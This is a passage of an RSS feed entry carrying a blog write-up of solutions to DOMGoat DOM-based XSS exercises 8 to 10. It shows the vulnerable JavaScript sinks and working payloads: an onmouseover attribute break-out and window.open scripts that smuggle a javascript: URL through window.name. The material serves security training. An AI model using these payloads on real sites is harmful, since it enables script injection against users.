-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;exercise---8&quot;&gt;Exercise - 8&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    let hash = location.hash;
-    let hashValueToUse = hash.length &amp;gt; 1 ? unescape(hash.substr(1)) : hash;
-
-    if (hashValueToUse.indexOf(&quot;=&quot;) &amp;gt; -1 ) {
-        hashValueToUse = hashValueToUse.substr(hashValueToUse.indexOf(&quot;=&quot;)+1);
-        hashValueToUse = hashValueToUse.replace(/&amp;lt;/g, &quot;&amp;amp;lt;&quot;).replace(/&amp;gt;/g, &quot;&amp;amp;gt;&quot;);
-        let msg = &quot;&amp;lt;a href='#user=&quot; + hashValueToUse + &quot;'&amp;gt;Welcome&amp;lt;/a&amp;gt;!!&quot;;
-        document.getElementById(&quot;msgboard&quot;).innerHTML = msg;
-    }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The source where user input is flowing from is &lt;code class=&quot;highlighter-rouge&quot;&gt;location.hash&lt;/code&gt; and the sink where user input ends up is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTMLElement.innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Here from the &lt;code class=&quot;highlighter-rouge&quot;&gt;location.hash&lt;/code&gt; value, the &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt; sign is check to be present through &lt;code class=&quot;highlighter-rouge&quot;&gt;hashValueToUse.indexOf(&quot;=&quot;)+1&lt;/code&gt; and everything after this is extracted. Any greater than or less than sign is also converted to HTML entities.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#' onmouseover=alert(window.location.pathname)//
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://domgo.at/cxss/example/8#=%23%27%20onmouseover%3Dalert(window.location.pathname)%2F%2F
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;exercise---9&quot;&gt;Exercise - 9&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    let hash = location.hash;
-    let hashValueToUse = hash.length &amp;gt; 1 ? unescape(hash.substr(1)) : hash;
-
-    if (hashValueToUse.indexOf(&quot;=&quot;) &amp;gt; -1 ) {
-        
-        hashValueToUse = hashValueToUse.substr(hashValueToUse.indexOf(&quot;=&quot;) + 1);
-        
-        if (hashValueToUse.length &amp;gt; 1) {
-            hashValueToUse = hashValueToUse.substr(0, 10);
-            hashValueToUse = hashValueToUse.replace(/&quot;/g, &quot;&amp;amp;quot;&quot;);
-            let windowValueToUse = window.name.replace(/&quot;/g, &quot;&amp;amp;quot;&quot;);
-            let msg = &quot;&amp;lt;a href=\&quot;&quot; + hashValueToUse + windowValueToUse + &quot;\&quot;&amp;gt;Welcome&amp;lt;/a&amp;gt;!!&quot;;
-            document.getElementById(&quot;msgboard&quot;).innerHTML = msg;
-        }
-    }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The source where user input is flowing from is &lt;code class=&quot;highlighter-rouge&quot;&gt;location.hash&lt;/code&gt; as part of &lt;code class=&quot;highlighter-rouge&quot;&gt;window.name&lt;/code&gt; and the sink where user input ends up is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTMLElement.innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;Window.name&lt;/code&gt; property gets/sets the name of the window’s browsing context. The &lt;code class=&quot;highlighter-rouge&quot;&gt;location.hash&lt;/code&gt; value of this window is then reflected back to the user. This can be emulated by creating a new webpage somewhere with the following JavaScript code.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://domgo.at/cxss/example/9#user=javascript'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;':alert(window.location.pathname)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;When openedm this will open a new window with the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; parameter being &lt;code class=&quot;highlighter-rouge&quot;&gt;javascript&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;window.name&lt;/code&gt; being &lt;code class=&quot;highlighter-rouge&quot;&gt;:alert(window.location.pathname)&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The “Welcome” link can be clicked to execute JavaScript.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss9-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;exercise---10&quot;&gt;Exercise - 10&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    let urlParts = location.href.split(&quot;?&quot;);
-    if (urlParts.length &amp;gt; 1) {
-        
-        let queryString = urlParts[1];
-        let queryParts = queryString.split(&quot;&amp;amp;&quot;);
-        let userId = &quot;&quot;;
-        for (let i = 0; i &amp;lt; queryParts.length; i++) {
-            
-            let keyVal = queryParts[i].split(&quot;=&quot;);
-            if (keyVal.length &amp;gt; 1) {
-                if (keyVal[0] === &quot;user&quot;) {
-                    
-                    userId = keyVal[1];
-                    break;
-                }
-            }
-        }
-        if (userId.startsWith(&quot;ID-&quot;)) {
-
-            userId = userId.substr(3, 10);
-            userId = userId.replace(/&quot;/g, &quot;&amp;amp;quot;&quot;);
-            let windowValueToUse = window.name.replace(/&quot;/g, &quot;&amp;amp;quot;&quot;);
-            let msg = &quot;&amp;lt;a href=\&quot;&quot; + userId + windowValueToUse + &quot;\&quot;&amp;gt;Welcome&amp;lt;/a&amp;gt;!!&quot;;
-            document.getElementById(&quot;msgboard&quot;).innerHTML = msg;
-        }
-    }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The source where user input is flowing from is &lt;code class=&quot;highlighter-rouge&quot;&gt;location.hash&lt;/code&gt; as part of &lt;code class=&quot;highlighter-rouge&quot;&gt;window.name&lt;/code&gt; and the sink where user input ends up is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTMLElement.innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;The value of the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; is extracted, this value is then checked to see if the value &lt;code class=&quot;highlighter-rouge&quot;&gt;ID-&lt;/code&gt; is present. If so, the value after &lt;code class=&quot;highlighter-rouge&quot;&gt;ID-&lt;/code&gt; is extracted, all double quotes are replaced within this parameter and the &lt;code class=&quot;highlighter-rouge&quot;&gt;window.name&lt;/code&gt; property. this is then inserted as part of a href link: &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a href=\&quot;&quot; + userId + windowValueToUse + &quot;\&quot;&amp;gt;Welcome&amp;lt;/a&amp;gt;&lt;/code&gt; which is served to &lt;code class=&quot;highlighter-rouge&quot;&gt;innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
-window.open('https://domgo.at/cxss/example/10?lang=en&amp;amp;user=ID-javascript', ':alert(window.location.pathname)');
-&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-</description>
-        <pubDate>Sat, 08 Feb 2020 09:00:00 +0000</pubDate>
-        <link>http://snoopysecurity.github.io/web-application-security/2020/02/08/08_domgoat_solutions.html</link>
-        <guid isPermaLink="true">http://snoopysecurity.github.io/web-application-security/2020/02/08/08_domgoat_solutions.html</guid>
-        
-        
-        <category>web-application-security</category>
         
       </item>
     
